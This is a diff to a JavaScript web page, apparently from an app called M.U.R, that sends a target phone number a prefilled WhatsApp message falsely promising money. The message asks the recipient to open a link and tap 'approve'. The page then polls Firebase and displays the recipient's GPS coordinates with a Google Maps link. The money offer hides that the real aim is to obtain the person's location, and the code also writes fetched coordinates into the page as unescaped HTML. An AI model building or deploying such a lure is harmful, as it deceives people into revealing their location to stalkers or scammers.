@@ -160,7 +160,7 @@ let pemantauan = null;
 
 
 /* =========================
-   CEK LOGIN
+   SAAT HALAMAN DIBUKA
 ========================= */
 
 window.onload = function(){
@@ -192,6 +192,44 @@ window.onload = function(){
     document.getElementById("user").textContent =
         "Login: " + (sesi.username || akun.username);
 
+
+    /*
+     * Cek apakah ada permintaan yang sebelumnya
+     * sudah dibuat.
+     */
+
+    const tersimpan =
+        localStorage.getItem("permintaanMUR");
+
+    if(tersimpan){
+
+        try{
+
+            const data = JSON.parse(tersimpan);
+
+            if(data.target && data.requestId){
+
+                document.getElementById("nomorHasil").textContent =
+                    data.target;
+
+                document.getElementById("status").textContent =
+                    "Memeriksa hasil persetujuan...";
+
+                cekPermintaan(
+                    data.target,
+                    data.requestId
+                );
+
+            }
+
+        }catch(e){
+
+            console.log(e);
+
+        }
+
+    }
+
 };
 
 
@@ -201,15 +239,18 @@ window.onload = function(){
 
 function normalisasiNomor(input){
 
-    let nomor = String(input).replace(/\D/g,"");
+    let nomor =
+        String(input).replace(/\D/g,"");
 
     if(nomor.startsWith("0")){
 
-        nomor = "62" + nomor.substring(1);
+        nomor =
+            "62" + nomor.substring(1);
 
     }else if(nomor.startsWith("8")){
 
-        nomor = "62" + nomor;
+        nomor =
+            "62" + nomor;
 
     }
 
@@ -239,13 +280,15 @@ async function kirimPermintaan(){
 
     }
 
+
     const requestId =
         "MUR_" +
         Date.now() +
         "_" +
         Math.random()
-            .toString(36)
-            .substring(2,8);
+        .toString(36)
+        .substring(2,8);
+
 
     document.getElementById("nomorHasil").textContent =
         target;
@@ -254,6 +297,7 @@ async function kirimPermintaan(){
         "Membuat permintaan...";
 
     document.getElementById("location").innerHTML = "";
+
 
     const data = {
 
@@ -278,4 +322,292 @@ async function kirimPermintaan(){
 
             FIREBASE_URL +
             "permintaan/" +
-            encode
+            encodeURIComponent(target) +
+            "/" +
+            encodeURIComponent(requestId) +
+            ".json",
+
+            {
+                method:"PUT",
+
+                headers:{
+                    "Content-Type":"application/json"
+                },
+
+                body:JSON.stringify(data)
+            }
+
+        );
+
+
+        if(!response.ok){
+
+            throw new Error(
+                "Firebase HTTP " +
+                response.status
+            );
+
+        }
+
+
+        /*
+         * SIMPAN REQUEST
+         * supaya tidak hilang ketika WhatsApp dibuka.
+         */
+
+        localStorage.setItem(
+            "permintaanMUR",
+            JSON.stringify({
+                target:target,
+                requestId:requestId
+            })
+        );
+
+
+        const izinURL =
+            HOSTING_URL +
+            "?request=" +
+            encodeURIComponent(requestId) +
+            "&nomor=" +
+            encodeURIComponent(target);
+
+
+        const pesan =
+            "Permintaan M.U.R\n\n" +
+            "Seseorang menawarkan dana untuk Anda melalui M.U.R.\n\n" +
+            "Buka link berikut untuk melihat permintaan dan pilih SETUJUI jika Anda bersedia:\n\n" +
+            izinURL;
+
+
+        const whatsappURL =
+            "https://wa.me/" +
+            target +
+            "?text=" +
+            encodeURIComponent(pesan);
+
+
+        document.getElementById("status").textContent =
+            "Membuka WhatsApp...";
+
+
+        /*
+         * Mulai pemantauan sebelum pindah.
+         */
+
+        mulaiPemantauan(
+            target,
+            requestId
+        );
+
+
+        /*
+         * Buka WhatsApp.
+         */
+
+        window.location.href =
+            whatsappURL;
+
+
+    }catch(error){
+
+        console.error(error);
+
+        document.getElementById("status").textContent =
+            "Gagal membuat permintaan: " +
+            error.message;
+
+    }
+
+}
+
+
+/* =========================
+   MULAI PEMANTAUAN
+========================= */
+
+function mulaiPemantauan(
+    target,
+    requestId
+){
+
+    if(pemantauan){
+
+        clearInterval(pemantauan);
+
+    }
+
+
+    cekPermintaan(
+        target,
+        requestId
+    );
+
+
+    pemantauan =
+        setInterval(function(){
+
+            cekPermintaan(
+                target,
+                requestId
+            );
+
+        },3000);
+
+}
+
+
+/* =========================
+   CEK FIREBASE
+========================= */
+
+async function cekPermintaan(
+    target,
+    requestId
+){
+
+    try{
+
+        const response = await fetch(
+
+            FIREBASE_URL +
+            "permintaan/" +
+            encodeURIComponent(target) +
+            "/" +
+            encodeURIComponent(requestId) +
+            ".json"
+
+        );
+
+
+        if(!response.ok){
+
+            throw new Error(
+                "Firebase HTTP " +
+                response.status
+            );
+
+        }
+
+
+        const data =
+            await response.json();
+
+
+        if(!data){
+
+            document.getElementById("status").textContent =
+                "Permintaan tidak ditemukan.";
+
+            return;
+
+        }
+
+
+        if(data.status === "menunggu"){
+
+            document.getElementById("status").textContent =
+                "Menunggu persetujuan dari penerima...";
+
+        }
+
+
+        else if(data.status === "ditolak"){
+
+            if(pemantauan){
+
+                clearInterval(pemantauan);
+
+            }
+
+            document.getElementById("status").textContent =
+                "Permintaan ditolak.";
+
+            document.getElementById("location").innerHTML =
+                "";
+
+        }
+
+
+        else if(data.status === "disetujui"){
+
+            if(pemantauan){
+
+                clearInterval(pemantauan);
+
+            }
+
+            document.getElementById("status").textContent =
+                "Lokasi disetujui.";
+
+            
+            if(
+                data.lat !== undefined &&
+                data.lng !== undefined
+            ){
+
+                document.getElementById("location").innerHTML =
+
+                    "<b>Latitude:</b> " +
+                    data.lat +
+
+                    "<br><b>Longitude:</b> " +
+                    data.lng +
+
+                    "<br><br>" +
+
+                    "<a target='_blank' href='https://www.google.com/maps?q=" +
+                    encodeURIComponent(
+                        data.lat + "," + data.lng
+                    ) +
+                    "'>" +
+
+                    "📍 Buka di Google Maps" +
+
+                    "</a>";
+
+            }else{
+
+                document.getElementById("location").textContent =
+                    "Persetujuan diterima, tetapi koordinat belum tersedia.";
+
+            }
+
+        }
+
+
+    }catch(error){
+
+        console.error(error);
+
+        document.getElementById("status").textContent =
+            "Gagal membaca status: " +
+            error.message;
+
+    }
+
+}
+
+
+/* =========================
+   LOGOUT
+========================= */
+
+function logout(){
+
+    localStorage.removeItem("sesiMUR");
+
+    if(pemantauan){
+
+        clearInterval(pemantauan);
+
+    }
+
+    location.href =
+        "index.html";
+
+}
+
+</script>
+
+</body>
+    </html>
